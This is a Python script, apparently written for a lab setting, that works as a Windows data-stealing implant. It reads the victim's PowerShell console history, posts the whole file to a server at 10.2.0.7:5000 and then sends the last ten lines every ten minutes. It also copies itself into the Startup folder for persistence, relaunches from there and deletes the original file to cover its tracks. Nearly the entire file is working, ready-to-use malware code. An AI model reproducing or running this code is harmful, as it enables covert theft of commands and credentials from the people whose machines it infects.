import time
import requests
import os
import shutil
import sys
import subprocess

## Note: In real life scenario obviously there wouldnt be print statements.

user = "user2_machine2"

# In real life this would be some domain
host = "10.2.0.7:5000" 

# Path to the file we want to exfiltrate, as an example we chose powershell console history
target_file_path = rf"C:\Users\{user}\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt"

# Server URL to send the data (replace with your actual server URL)
server_url = f"http://{host}/upload"

# Function to read the whole file
def read_entire_file():
    try:
        with open(target_file_path, 'r', encoding='utf-8') as file:
            data = file.read()
            return data
    except FileNotFoundError:
        print(f"Error: {target_file_path} not found.")
        return None

# Function to read the last 10 lines of the file
def read_last_n_lines(n=10):
    try:
        with open(target_file_path, 'r', encoding='utf-8') as file:
            lines = file.readlines()
            return lines[-n:]  # Get last 'n' lines
    except FileNotFoundError:
        print(f"Error: {target_file_path} not found.")
        return None

# Function to send data to the server
def send_data_to_server(data):
    try:
        response = requests.post(server_url, data={'content': data})
        if response.status_code == 200:
            print("Data sent successfully")
        else:
            print(f"Failed to send data. Server responded with status code {response.status_code}")
    except Exception as e:
        print(f"Error sending data: {e}")

# Function to check if the current .exe file is in the startup folder
def check_and_copy_to_startup():
    # Get the path of the current running script (when compiled to .exe)
    current_script = sys.argv[0]

    # Determine the startup folder path
    startup_folder = os.path.expandvars(r'%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup')
    target_exe_path = os.path.join(startup_folder, os.path.basename(current_script))

    # If the .exe file is already in the startup folder, do nothing
    if os.path.exists(target_exe_path):
        print("The script is already in the startup folder.")
        return

    # If not, copy it there
    try:
        print(f"Copying {current_script} to {target_exe_path}...")
        shutil.copy2(current_script, target_exe_path)
        print("File copied to startup folder.")

        # Execute the copied script
        print(f"Executing the script from the startup folder: {target_exe_path}")
        subprocess.Popen([target_exe_path])
        
        # After copying and executing, attempting to delete the original file to remove its trace
        print(f"Deleting the original file: {current_script}")
        time.sleep(1)
        os.remove(current_script)
        print("Original file deleted.")
        sys.exit(0)  # Exit the script to ensure it doesn't continue running from the original location
    except Exception as e:
        print(f"Error during file copy or delete: {e}")

def execute():
    # Initial send of the whole file
    initial_data = read_entire_file()
    if initial_data:
        print("Sending the entire file content...")
        send_data_to_server(initial_data)

    # Send the last 10 lines every 10 minutes
    while True:
        time.sleep(600)  # Sleep for 10 minute
        print("Sending the last 10 lines of the file...")
        last_lines = read_last_n_lines(10)
        if last_lines:
            send_data_to_server(''.join(last_lines))

# Initial setup: check and copy to startup if necessary
check_and_copy_to_startup()

# If the script has not exited after copying, continue execution
execute()
